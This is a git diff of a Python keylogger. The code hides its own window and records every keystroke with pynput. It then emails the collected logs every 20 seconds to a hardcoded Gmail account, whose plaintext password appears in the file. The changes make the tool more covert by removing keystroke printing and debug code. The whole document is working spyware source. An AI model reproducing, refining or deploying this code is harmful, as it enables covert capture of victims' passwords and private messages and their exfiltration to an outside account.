@@ -1,5 +1,5 @@
 import win32gui, win32con
-#idk what this does but it closes everything
+#this hides the program
 hide = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(hide, win32con.SW_HIDE)
 from pynput.keyboard import Listener
@@ -10,7 +10,7 @@ from datetime import datetime
 interval_Between_Sends = 20
 email_address = "sendKeyloggerLogs@gmail.com"
 password = "!Havenotyetbeguntofight$"
-allTheKeystrokes="this is a test"
+allTheKeystrokes=""
 
 
 def keylogger(keystroke):
@@ -23,7 +23,7 @@ def keylogger(keystroke):
         keystroke = ''
     elif keystroke == 'Key.enter':
         keystroke = '\n'
-    print(keystroke)
+    #print(keystroke)
     allTheKeystrokes+=keystroke
 
 
@@ -37,16 +37,10 @@ def emailLogs():
     allTheKeystrokes=""
     Timer(interval_Between_Sends,emailLogs).start()
 
-def other():
-    print("this works")
-    Timer(interval_Between_Sends,emailLogs).start()
-
 
 Timer(interval_Between_Sends,emailLogs).start()
 with Listener(on_press=keylogger) as l:
     l.join()
 
-# listener = Listener(
-#     on_press=keylogger)
-# listener.start()
+
     
